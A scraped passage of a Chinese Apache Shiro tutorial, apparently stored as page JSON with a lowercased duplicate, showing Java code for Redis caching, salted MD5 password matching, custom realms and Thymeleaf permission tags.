key:"+k+",Value:"+value);\n        return value;\n    }\n\n    @Override\n    public void clear() throws CacheException {\n        System.out.println("【Redis - CLEAR】{} ");\n        redisTemplate.delete(this.getCacheName());\n    }\n\n    @Override\n    public int size() {\n        return redisTemplate.opsForHash().size(this.cacheName).intValue();\n    }\n\n    @Override\n    public Set<K> keys() {\n        return redisTemplate.opsForHash().keys(this.cacheName);\n    }\n\n    @Override\n    public Collection<V> values() {\n        return redisTemplate.opsForHash().values(this.cacheName);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n\n\n配置缓存管理器\n\n@Bean\npublic DefaultWebSecurityManager defaultWebSecurityManager(AuthorizingRealm realm,RedisCacheManager redisCacheManager){\n\n  DefaultWebSecurityManager defaultWebSecurityManager = new DefaultWebSecurityManager();\n\n  HashedCredentialsMatcher credentialsMatcher = new HashedCredentialsMatcher();\n  credentialsMatcher.setHashAlgorithmName("MD5");\n  credentialsMatcher.setHashIterations(1024);\n  realm.setCredentialsMatcher(credentialsMatcher);\n  realm.setCacheManager(redisCacheManager);\n  realm.setCachingEnabled(true);\n  realm.setAuthorizationCachingEnabled(true);\n  realm.setAuthenticationCachingEnabled(true);\n  defaultWebSecurityManager.setRealm(realm);\n  return defaultWebSecurityManager;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n测试之后报错，因为盐不能够序列化，因此还需要解决这个bug\n\nnested exception is java.io.NotSerializableException: org.apache.shiro.util.SimpleByteSource\n\npackage com.pwddd.shirojsp.cache;\n\nimport org.apache.shiro.codec.Base64;\nimport org.apache.shiro.codec.CodecSupport;\nimport org.apache.shiro.codec.Hex;\nimport org.apache.shiro.util.ByteSource;\n\nimport java.io.File;\nimport java.io.InputStream;\nimport java.io.Serializable;\nimport java.util.Arrays;\n\npublic class CustomerByteSource implements ByteSource, Serializable {\n\n\n    private static final long serialVersionUID = -6698337076775679951L;\n    private  byte[] bytes;\n    private String cachedHex;\n    private String cachedBase64;\n\n    public CustomerByteSource(byte[] bytes) {\n        this.bytes = bytes;\n    }\n\n    /**\n     * Creates an instance by converting the characters to a byte array (assumes UTF-8 encoding).\n     *\n     * @param chars the source characters to use to create the underlying byte array.\n     * @since 1.1\n     */\n    public CustomerByteSource(char[] chars) {\n        this.bytes = CodecSupport.toBytes(chars);\n    }\n\n    /**\n     * Creates an instance by converting the String to a byte array (assumes UTF-8 encoding).\n     *\n     * @param string the source string to convert to a byte array (assumes UTF-8 encoding).\n     * @since 1.1\n     */\n    public CustomerByteSource(String string) {\n        this.bytes = CodecSupport.toBytes(string);\n    }\n\n    /**\n     * Creates an instance using the sources bytes directly - it does not create a copy of the\n     * argument\'s byte array.\n     *\n     * @param source the source to use to populate the underlying byte array.\n     * @since 1.1\n     */\n    public CustomerByteSource(ByteSource source) {\n        this.bytes = source.getBytes();\n    }\n\n    /**\n     * Creates an instance by converting the file to a byte array.\n     *\n     * @param file the file from which to acquire bytes.\n     * @since 1.1\n     */\n    public CustomerByteSource(File file) {\n        this.bytes = new CustomerByteSource.BytesHelper().getBytes(file);\n    }\n\n    /**\n     * Creates an instance by converting the stream to a byte array.\n     *\n     * @param stream the stream from which to acquire bytes.\n     * @since 1.1\n     */\n    public CustomerByteSource(InputStream stream) {\n        this.bytes = new CustomerByteSource.BytesHelper().getBytes(stream);\n    }\n\n    /**\n     * Returns {@code true} if the specified object is a recognized data type that can be easily converted to\n     * bytes by instances of this class, {@code false} otherwise.\n     * <p/>\n     * This implementation returns {@code true} IFF the specified object is an instance of one of the following\n     * types:\n     * <ul>\n     * <li>{@code byte[]}</li>\n     * <li>{@code char[]}</li>\n     * <li>{@link ByteSource}</li>\n     * <li>{@link String}</li>\n     * <li>{@link File}</li>\n     * </li>{@link InputStream}</li>\n     * </ul>\n     *\n     * @param o the object to test to see if it can be easily converted to bytes by instances of this class.\n     * @return {@code true} if the specified object can be easily converted to bytes by instances of this class,\n     *         {@code false} otherwise.\n     * @since 1.2\n     */\n    public static boolean isCompatible(Object o) {\n        return o instanceof byte[] || o instanceof char[] || o instanceof String ||\n                o instanceof ByteSource || o instanceof File || o instanceof InputStream;\n    }\n\n    public byte[] getBytes() {\n        return this.bytes;\n    }\n\n    public boolean isEmpty() {\n        return this.bytes == null || this.bytes.length == 0;\n    }\n\n    public String toHex() {\n        if ( this.cachedHex == null ) {\n            this.cachedHex = Hex.encodeToString(getBytes());\n        }\n        return this.cachedHex;\n    }\n\n    public String toBase64() {\n        if ( this.cachedBase64 == null ) {\n            this.cachedBase64 = Base64.encodeToString(getBytes());\n        }\n        return this.cachedBase64;\n    }\n\n    public String toString() {\n        return toBase64();\n    }\n\n    public int hashCode() {\n        if (this.bytes == null || this.bytes.length == 0) {\n            return 0;\n        }\n        return Arrays.hashCode(this.bytes);\n    }\n\n    public boolean equals(Object o) {\n        if (o == this) {\n            return true;\n        }\n        if (o instanceof ByteSource) {\n            ByteSource bs = (ByteSource) o;\n            return Arrays.equals(getBytes(), bs.getBytes());\n        }\n        return false;\n    }\n\n    //will probably be removed in Shiro 2.0.  See SHIRO-203:\n    //https://issues.apache.org/jira/browse/SHIRO-203\n    private static final class BytesHelper extends CodecSupport {\n        public byte[] getBytes(File file) {\n            return toBytes(file);\n        }\n\n        public byte[] getBytes(InputStream stream) {\n            return toBytes(stream);\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n\n\n自定义ByteSource之后修改生成盐的方式：\n\n@Override\nprotected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException {\n  System.out.println("====================================");\n  String principal = (String) authenticationToken.getPrincipal();\n\n  System.out.println(principal);\n  // 1. 利用名字去查询数据库\n  User user = userService.getUser(principal);\n  if (user != null){\n    System.out.println(user.getId());\n    return new SimpleAuthenticationInfo(\n      user.getUsername(),\n      user.getPassword(),\n      new CustomerByteSource(user.getId().getBytes(StandardCharsets.UTF_8)),\n      this.getName()\n    );\n  }\n  return null;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n这里不知道为什么只有授权的缓存，没有认证的缓存，另外，二次登陆会报错。\n\n//TODO\n\n# 10. thymeleaf 权限控制\n\n# 0. 导入依赖\n\n<dependency>\n  <groupId>com.github.theborakompanioni</groupId> \n  <artifactId>thymeleaf-extras-shiro</artifactId> \n  <version>2.0.0</version> \n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n# 1. 引入名称空间\n\nxmlns:shiro="http://www.pollix.at/thymeleaf/shiro"\n\n\n1\n\n\n# 2. 常见的权限控制标签\n\n\x3c!-- 验证当前用户是否为“访客”，即未认证（包含未记住）的用户。 --\x3e\n<p shiro:guest="">Please <a href="login.html">login</a></p>\n\n\n\x3c!-- 认证通过或已记住的用户。 --\x3e\n<p shiro:user="">\n    Welcome back John! Not John? Click <a href="login.html">here</a> to login.\n</p>\n\n\x3c!-- 已认证通过的用户。不包含已记住的用户，这是与user标签的区别所在。 --\x3e\n<p shiro:authenticated="">\n    Hello, <span shiro:principal=""></span>, how are you today?\n</p>\n<a shiro:authenticated="" href="updateAccount.html">Update your contact information</a>\n\n\x3c!-- 输出当前用户信息，通常为登录帐号信息。 --\x3e\n<p>Hello, <shiro:principal/>, how are you today?</p>\n\n\n\x3c!-- 未认证通过用户，与authenticated标签相对应。与guest标签的区别是，该标签包含已记住用户。 --\x3e\n<p shiro:notAuthenticated="">\n    Please <a href="login.html">login</a> in order to update your credit card information.\n</p>\n\n\x3c!-- 验证当前用户是否属于该角色。 --\x3e\n<a shiro:hasRole="admin" href="admin.html">Administer the system</a>\x3c!-- 拥有该角色 --\x3e\n\n\x3c!-- 与hasRole标签逻辑相反，当用户不属于该角色时验证通过。 --\x3e\n<p shiro:lacksRole="developer">\x3c!-- 没有该角色 --\x3e\n    Sorry, you are not allowed to developer the system.\n</p>\n\n\x3c!-- 验证当前用户是否属于以下所有角色。 --\x3e\n<p shiro:hasAllRoles="developer, 2">\x3c!-- 角色与判断 --\x3e\n    You are a developer and a admin.\n</p>\n\n\x3c!-- 验证当前用户是否属于以下任意一个角色。  --\x3e\n<p shiro:hasAnyRoles="admin, vip, developer,1">\x3c!-- 角色或判断 --\x3e\n    You are a admin, vip, or developer.\n</p>\n\n\x3c!--验证当前用户是否拥有指定权限。  --\x3e\n<a shiro:hasPermission="userInfo:add" href="createUser.html">添加用户</a>\x3c!-- 拥有权限 --\x3e\n\n\x3c!-- 与hasPermission标签逻辑相反，当前用户没有制定权限时，验证通过。 --\x3e\n<p shiro:lacksPermission="userInfo:del">\x3c!-- 没有权限 --\x3e\n    Sorry, you are not allowed to delete user accounts.\n</p>\n\n\x3c!-- 验证当前用户是否拥有以下所有角色。 --\x3e\n<p shiro:hasAllPermissions="userInfo:view, userInfo:add">\x3c!-- 权限与判断 --\x3e\n    You can see or add users.\n</p>\n\n\x3c!-- 验证当前用户是否拥有以下任意一个权限。  --\x3e\n<p shiro:hasAnyPermissions="userInfo:view, userInfo:del">\x3c!-- 权限或判断 --\x3e\n    You can see or delete users.\n</p>\n<a shiro:hasPermission="pp" href="createUser.html">Create a new User</a>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n# 3. 加入方言解析\n\n@Bean(name = "shiroDialect")\npublic ShiroDialect shiroDialect(){\n  return new ShiroDialect();\n}\n\n\n1\n2\n3\n4\n\n\n\n# 参考资料\n\n 1. Bilibiili编程不良人：https://www.bilibili.com/video/BV1uz4y197Zm',normalizedContent:'# shiro\n\nshiro 是一个功能强大且易于使用的java安全框架，它执行身份验证、授权、加密和会话管理。使用shiro易于理解的api，您可以快速轻松地保护任何应用程序—从最小的移动应用程序到最大的web和企业应用程序。\n\n\n# 权限管理\n\n\n# 权限管理的概念\n\n基本上涉及到用户参与的系统都要进行权限管理，权限管理属于系统安全的范畴，权限管理实现对用户访问系统的控制，按照安全规则或者安全策略控制用户可以访问而且只能访问自己被授权的资源。\n\n权限管理包括用户身份认证和授权两部分，简称认证授权。对于需要访问控制的资源用户首先经过身份认证，认证通过后用户具有该资源的访问权限方可访问。\n\n\n# 身份认证的概念\n\n身份认证，就是判断一个用户是否为合法用户的处理过程。最常用的简单身份认证方式是系统通过核对用户输入的用户名和口令，看其是否与系统中存储的该用户的用户名和口令一致，来判断用户身份是否正确。对于采用指纹等系统，则出示指纹；对于硬件key等刷卡系统，则需要刷卡。\n\n\n# 授权的概念\n\n授权，即访问控制，控制谁能访问哪些资源。主体进行身份认证后需要分配权限方可访问系统的资源，对于某些资源没有权限是无法访问的。\n\n\n# shiro的简介\n\n> apache shiro™ is a powerful and easy-to-use java security framework that performs authentication, authorization, cryptography, and session management. with shiro’s easy-to-understand api, you can quickly and easily secure any application – from the smallest mobile applications to the largest web and enterprise applications.\n> \n> shiro 是一个功能强大且易于使用的java安全框架，它执行身份验证、授权、加密和会话管理。使用shiro易于理解的api，您可以快速轻松地保护任何应用程序—从最小的移动应用程序到最大的web和企业应用程序。\n> \n> shiro是apache旗下一个开源框架，它将软件系统的安全认证相关的功能抽取出来，实现用户身份认证，权限授权、加密、会话管理等功能，组成了一个通用的安全认证框架。\n\n\n# shiro的核心架构\n\n\n\n# subject\n\nsubject即主体，外部应用与subject进行交互，subject记录了当前操作用户，将用户的概念理解为当前操作的主体，可能是一个通过浏览器请求的用户，也可能是一个运行的程序。subject在shiro中是一个接口，接口中定义了很多认证授相关的方法，外部程序通过subject进行认证授，而subject是通过securitymanager安全管理器进行认证授权。\n\n# securitymanager\n\nsecuritymanager即安全管理器，对全部的subject进行安全管理，它是shiro的核心，负责对所有的subject进行安全管理。通过securitymanager可以完成subject的认证、授权等，实质上securitymanager是通过authenticator进行认证，通过authorizer进行授权，通过sessionmanager进行会话管理等。\n\nsecuritymanager是一个接口，继承了authenticator, authorizer, sessionmanager这三个接口。\n\n# authenticator\n\nauthenticator即认证器，对用户身份进行认证，authenticator是一个接口，shiro提供modularrealmauthenticator实现类，通过modularrealmauthenticator基本上可以满足大多数需求，也可以自定义认证器。\n\n# authorizer\n\nauthorizer即授权器，用户通过认证器认证通过，在访问功能时需要通过授权器判断用户是否有此功能的操作权限。\n\n# realm\n\nrealm即领域，相当于datasource数据源，securitymanager进行安全认证需要通过realm获取用户权限数据，比如：如果用户身份数据在数据库那么realm就需要从数据库获取用户身份信息。\n\n注意：不要把realm理解成只是从数据源取数据，在realm中还有认证授权校验的相关的代码。\n\n# sessionmanager\n\nsessionmanager即会话管理，shiro框架定义了一套会话管理，它不依赖web容器的session，所以shiro可以使用在非web应用上，也可以将分布式应用的会话集中在一点管理，此特性可使它实现单点登录。\n\n# sessiondao\n\nsessiondao即会话dao，是对session会话操作的一套接口，比如要将session存储到数据库，可以通过jdbc将会话存储到数据库。\n\n# cachemanager\n\ncachemanager即缓存管理，将用户权限数据存储在缓存，这样可以提高性能。\n\n# cryptography\n\ncryptography即密码管理，shiro提供了一套加密/解密的组件，方便开发。比如提供常用的散列、加/解密等功能。\n\n\n# shiro认证\n\n> 身份认证，就是判断一个用户是否为合法用户的处理过程。最常用的简单身份认证方式是系统通过核对用户输入的用户名和口令，看其是否与系统中存储的该用户的用户名和口令一致，来判断用户身份是否正确。\n\n\n# 认证的相关对象\n\n# subject 主体\n\n访问系统的用户，主体可以是用户、程序等，进行认证的都称为主体；\n\n# principal 身份信息\n\n主体（subject）进行身份认证的标识，标识必须具有唯一性，如用户名、手机号、邮箱地址等，一个主体可以有多个身份，但是必须有一个主身份（primary principal）。\n\n# credential 凭证信息\n\n只有主体自己知道的安全信息，如密码、证书等。\n\n\n# 认证的流程\n\n\n\n\n# 实现一个最简单的认证\n\n 1. 添加shiro的依赖，本次使用的shiro版本是：shiro1.5.3\n    \n    <dependencies>\n      <dependency>\n        <groupid>org.apache.shiro</groupid>\n        <artifactid>shiro-core</artifactid>\n        <version>1.5.3</version>\n      </dependency>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 2. 引入shiro配置文件，这个配置文件在后续的整合中用不到，只是为了学习使用的一个模拟的场景，以后的用户身份信息是要从数据库中取的。\n    \n    [users]\n    zhangsan=123456\n    lisi=123.bmk\n    \n    \n    1\n    2\n    3\n    \n\n 3. 测试认证的代码\n    \n    package com.pwddd.shirodemo;\n    \n    import org.apache.shiro.securityutils;\n    import org.apache.shiro.authc.incorrectcredentialsexception;\n    import org.apache.shiro.authc.unknownaccountexception;\n    import org.apache.shiro.authc.usernamepasswordtoken;\n    import org.apache.shiro.mgt.defaultsecuritymanager;\n    import org.apache.shiro.realm.text.inirealm;\n    import org.apache.shiro.subject.subject;\n    \n    public class testauthenticator {\n        public static void main(string[] args) {\n    \n            // 1. 创建securitymanager\n            defaultsecuritymanager defaultsecuritymanager = new defaultsecuritymanager();\n    \n            // 2. 创建默认的inirealm 指定ini配置文件的位置\n            inirealm inirealm = new inirealm("classpath:shiro.ini");\n    \n            // 3. 给securitymanager设置一个realm\n            defaultsecuritymanager.setrealm(inirealm);\n    \n            // 4. 将安全工具类中设置一个安全管理器\n            securityutils.setsecuritymanager(defaultsecuritymanager);\n    \n            // 5. 获取主体对象\n            subject subject = securityutils.getsubject();\n    \n            // 6. 模拟登陆信息创建令牌\n            usernamepasswordtoken token = new usernamepasswordtoken("zhangsan", "123456");\n    \n            try {\n    \n                // 7. 尝试使用令牌登陆\n                subject.login(token);\n                system.out.println("认证成功"+subject.isauthenticated());\n            }catch (unknownaccountexception e){\n                system.out.println("用户名不存在");\n            }catch (incorrectcredentialsexception e){\n                system.out.println("认证未通过");\n            }\n        }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    \n\n对应的异常分类：\n\n * disabledaccountexception（帐号被禁用）\n\n * lockedaccountexception（帐号被锁定）\n\n * excessiveattemptsexception（登录失败次数过多）\n\n * expiredcredentialsexception（凭证过期）等\n\n\n# 源码追踪shiro中的认证过程\n\n用户名验证的调用：\n\ndogetauthenticationinfo:162, simpleaccountrealm (org.apache.shiro.realm)\ngetauthenticationinfo:571, authenticatingrealm (org.apache.shiro.realm)\ndosinglerealmauthentication:180, modularrealmauthenticator (org.apache.shiro.authc.pam)\ndoauthenticate:273, modularrealmauthenticator (org.apache.shiro.authc.pam)\nauthenticate:198, abstractauthenticator (org.apache.shiro.authc)\nauthenticate:106, authenticatingsecuritymanager (org.apache.shiro.mgt)\nlogin:275, defaultsecuritymanager (org.apache.shiro.mgt)\nlogin:260, delegatingsubject (org.apache.shiro.subject.support)\nmain:35, testauthenticator (com.pwddd.shirodemo)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n最终在org.apache.shiro.realm.simpleaccountrealm#dogetauthenticationinfo根据token中的用户名在在对应的配置文件中查找对应的用户，此处还没有做密码的校验。\n\n\n\n密码校验的调用：\n\ndocredentialsmatch:127, simplecredentialsmatcher (org.apache.shiro.authc.credential)\nassertcredentialsmatch:600, authenticatingrealm (org.apache.shiro.realm)\ngetauthenticationinfo:581, authenticatingrealm (org.apache.shiro.realm)\ndosinglerealmauthentication:180, modularrealmauthenticator (org.apache.shiro.authc.pam)\ndoauthenticate:273, modularrealmauthenticator (org.apache.shiro.authc.pam)\nauthenticate:198, abstractauthenticator (org.apache.shiro.authc)\nauthenticate:106, authenticatingsecuritymanager (org.apache.shiro.mgt)\nlogin:275, defaultsecuritymanager (org.apache.shiro.mgt)\nlogin:260, delegatingsubject (org.apache.shiro.subject.support)\nmain:35, testauthenticator (com.pwddd.shirodemo)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n最终在org.apache.shiro.authc.credential.simplecredentialsmatcher#docredentialsmatch中验证密码是否匹配。\n\n\n\nshiro中的realm的类结构如下：\n\n\n\n根据源码发现，认证使用的是simpleaccountrealm\n\n\n\n在simpleaccountrealm有两个方法，一个是用来认证的，另一个是用来授权的。\n\npublic class simpleaccountrealm extends authorizingrealm {\n  //.......省略\n  protected authenticationinfo dogetauthenticationinfo(authenticationtoken token) throws authenticationexception {\n    usernamepasswordtoken uptoken = (usernamepasswordtoken) token;\n    simpleaccount account = getuser(uptoken.getusername());\n\n    if (account != null) {\n\n      if (account.islocked()) {\n        throw new lockedaccountexception("account [" + account + "] is locked.");\n      }\n      if (account.iscredentialsexpired()) {\n        string msg = "the credentials for account [" + account + "] are expired";\n        throw new expiredcredentialsexception(msg);\n      }\n\n    }\n\n    return account;\n  }\n\n  protected authorizationinfo dogetauthorizationinfo(principalcollection principals) {\n    string username = getusername(principals);\n    users_lock.readlock().lock();\n    try {\n      return this.users.get(username);\n    } finally {\n      users_lock.readlock().unlock();\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 自定义的realm\n\n在上面的程序中，我们使用的shiro自带的inirealm，并且用户名密码是储存到ini配置文件中的，在大部分的情况下，我们需要从系统的数据库中读取相关的用户信息，因此需要自定义realm。\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.authenticationinfo;\nimport org.apache.shiro.authc.authenticationtoken;\nimport org.apache.shiro.authc.simpleauthenticationinfo;\nimport org.apache.shiro.authz.authorizationinfo;\nimport org.apache.shiro.realm.authenticatingrealm;\nimport org.apache.shiro.realm.authorizingrealm;\nimport org.apache.shiro.subject.principalcollection;\n\npublic class customerrealm extends authorizingrealm {\n    @override\n    protected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n        return null;\n    }\n\n    @override\n    protected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n        string principal = (string) authenticationtoken.getprincipal();\n        if ("zhangsan".equals(principal)){\n          \n          \t// 这里模拟从数据库中查询获取到的用户名和密码\n            simpleauthenticationinfo authenticationinfo = new simpleauthenticationinfo("zhangsan", "123", this.getname());\n            return authenticationinfo;\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n自定义realm的测试方法：\n\npackage com.pwddd.shirodemo;\n\nimport com.pwddd.shirodemo.realm.customerrealm;\nimport org.apache.shiro.securityutils;\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.usernamepasswordtoken;\nimport org.apache.shiro.mgt.defaultsecuritymanager;\nimport org.apache.shiro.subject.subject;\n\npublic class testcustomerrealm {\n    public static void main(string[] args) {\n        defaultsecuritymanager defaultsecuritymanager = new defaultsecuritymanager();\n        defaultsecuritymanager.setrealm(new customerrealm());\n\n        securityutils.setsecuritymanager(defaultsecuritymanager);\n\n        subject subject = securityutils.getsubject();\n\n        usernamepasswordtoken token = new usernamepasswordtoken("zhangsan", "123");\n\n\n        try {\n            subject.login(token);\n        } catch (authenticationexception e) {\n            e.printstacktrace();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n# 使用md5加密和盐\n\n> 在上面的测试中，我们一直使用的是明文密码的方式，这种方式有很大的安全隐患，和我们使用安全框架的初衷相背离。在实际的场景中，一般是在注册阶段，将用户设置的密码加盐然后散列存储到数据库中，然后使用shiro从数据库中读取出盐和秘文，完成密码校验。\n\n# md5测试\n\npackage com.pwddd.shirodemo;\n\nimport org.apache.shiro.crypto.hash.md5hash;\n\npublic class testmd5 {\n  public static void main(string[] args) {\n\n    md5hash hash = new md5hash();\n    hash.setbytes("123456".getbytes());\n    system.out.println(hash.tohex()); // 313233343536\n\n\n    // md5加密\n    md5hash md5hash = new md5hash("123456");\n    system.out.println(md5hash.tohex()); // e10adc3949ba59abbe56e057f20f883e\n    // 加盐\n    md5hash md5hashwithsalt = new md5hash("123456","123/bmk#");\n    system.out.println(md5hashwithsalt.tohex()); //a43ebab3045680d4b3d6c5ccac659d10\n\n    //散列\n    md5hash hashinter = new md5hash("123456", "123/bmk#", 1024);\n    system.out.println(hashinter.tohex()); //a991e133559f1891893b60a3c04e8740\n\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# 自定义realm实现md5\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.authenticationinfo;\nimport org.apache.shiro.authc.authenticationtoken;\nimport org.apache.shiro.authc.simpleauthenticationinfo;\nimport org.apache.shiro.authz.authorizationinfo;\nimport org.apache.shiro.realm.authenticatingrealm;\nimport org.apache.shiro.realm.authorizingrealm;\nimport org.apache.shiro.subject.principalcollection;\n\npublic class customerrealm extends authorizingrealm {\n  @override\n  protected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n    return null;\n  }\n\n  @override\n  protected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n    string credentials = (string) authenticationtoken.getcredentials();\n    if ("zhangsan".equals(credentials)){\n      \n      // 模拟查出来的密码是加密后的密码，其他不变\n      simpleauthenticationinfo authenticationinfo = new simpleauthenticationinfo(\n        "zhangsan",\n        "e10adc3949ba59abbe56e057f20f883e",\n        this.getname());\n\n      return authenticationinfo;\n    }\n    return null;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n测试方法：\n\npackage com.pwddd.shirodemo;\n\nimport com.pwddd.shirodemo.realm.customerrealm;\nimport org.apache.shiro.securityutils;\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.usernamepasswordtoken;\nimport org.apache.shiro.authc.credential.hashedcredentialsmatcher;\nimport org.apache.shiro.mgt.defaultsecuritymanager;\nimport org.apache.shiro.subject.subject;\n\npublic class testmd5realm {\n    public static void main(string[] args) {\n        defaultsecuritymanager defaultsecuritymanager = new defaultsecuritymanager();\n\n        customerrealm customerrealm = new customerrealm();\n\n        // 设置md5加密\n        hashedcredentialsmatcher hashedcredentialsmatcher = new hashedcredentialsmatcher();\n        hashedcredentialsmatcher.sethashalgorithmname("md5");\n\n        customerrealm.setcredentialsmatcher(hashedcredentialsmatcher);\n\n        defaultsecuritymanager.setrealm(customerrealm);\n\n        securityutils.setsecuritymanager(defaultsecuritymanager);\n\n        subject subject = securityutils.getsubject();\n\n        usernamepasswordtoken token = new usernamepasswordtoken("zhangsan", "123456");\n\n        try {\n            subject.login(token);\n            system.out.println("登陆成功");\n        } catch (authenticationexception e) {\n            e.printstacktrace();\n        }\n\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n# 自定义realm实现md5加salt方式\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.authenticationinfo;\nimport org.apache.shiro.authc.authenticationtoken;\nimport org.apache.shiro.authc.simpleauthenticationinfo;\nimport org.apache.shiro.authz.authorizationinfo;\nimport org.apache.shiro.realm.authenticatingrealm;\nimport org.apache.shiro.realm.authorizingrealm;\nimport org.apache.shiro.subject.principalcollection;\nimport org.apache.shiro.util.bytesource;\n\npublic class customerrealm extends authorizingrealm {\n    @override\n    protected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n        return null;\n    }\n\n    @override\n    protected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n        string principal = (string) authenticationtoken.getprincipal();\n\n        if ("zhangsan".equals(principal)){\n            simpleauthenticationinfo authenticationinfo = new simpleauthenticationinfo(\n                    "zhangsan",\n                    "a43ebab3045680d4b3d6c5ccac659d10",\n                    // 由于盐也是从数据库中查出来的，因此在这里一起配置了\n                    bytesource.util.bytes("123/bmk#"),\n                    this.getname());\n\n            return authenticationinfo;\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n测试方法和上面的一样。\n\n# 自定义realm 实现 自定义md5+salt+散列\n\n 1. 如果使用了散列hash，则从数据库中查出来的是散列之后的，因此realm不需要变\n\n 2. 测试方法中需要指定散列的次数，因为用户输入明文密码时，shrio不知道散列的次数，因此对比会失败。\n    \n    package com.pwddd.shirodemo;\n    \n    import com.pwddd.shirodemo.realm.customerrealm;\n    import org.apache.shiro.securityutils;\n    import org.apache.shiro.authc.authenticationexception;\n    import org.apache.shiro.authc.incorrectcredentialsexception;\n    import org.apache.shiro.authc.usernamepasswordtoken;\n    import org.apache.shiro.authc.credential.hashedcredentialsmatcher;\n    import org.apache.shiro.mgt.defaultsecuritymanager;\n    import org.apache.shiro.subject.subject;\n    \n    public class testmd5realm {\n      public static void main(string[] args) {\n        defaultsecuritymanager defaultsecuritymanager = new defaultsecuritymanager();\n    \n        customerrealm customerrealm = new customerrealm();\n    \n        // 设置md5加密\n        hashedcredentialsmatcher hashedcredentialsmatcher = new hashedcredentialsmatcher();\n        hashedcredentialsmatcher.sethashalgorithmname("md5");\n        // 设置散列次数\n        hashedcredentialsmatcher.sethashiterations(1024);\n    \n        